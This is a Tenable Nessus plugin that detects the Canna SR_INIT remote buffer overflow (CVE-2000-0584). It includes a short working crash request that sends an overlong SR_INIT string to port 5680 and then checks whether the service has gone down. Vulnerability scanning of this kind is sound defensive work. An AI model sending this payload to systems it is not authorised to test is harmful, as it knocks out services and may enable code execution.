#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11114);
 script_bugtraq_id(1445);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CVE-2000-0584");
 script_xref(name:"OSVDB", value:"1452");
 script_name(english:"Canna SR_INIT Command Remote Overflow");
 script_summary(english:"Checks if the remote Canna can be buffer overflown");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote language translation service has a buffer overflow\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running Canna, a service that processes Japanese\n",
     "input and translates it from kana to kanji.\n\n",
     "It was possible to make the remote Canna server crash by sending a\n",
     "SR_INIT command with a very long string.  A remote attacker could use\n",
     "this to crash the service, or possibly execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/vendor/2000-q2/0062.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of the software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();
		    
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
		  
 script_require_ports(5680);
 exit(0);
}

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = 5680;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
  req = raw_string(0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 50) + 
        "3.3:" + crap(300) + raw_string(0);
  send(socket:soc, data:req);
  r = recv(socket:soc, length:4);
  close(soc);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
}
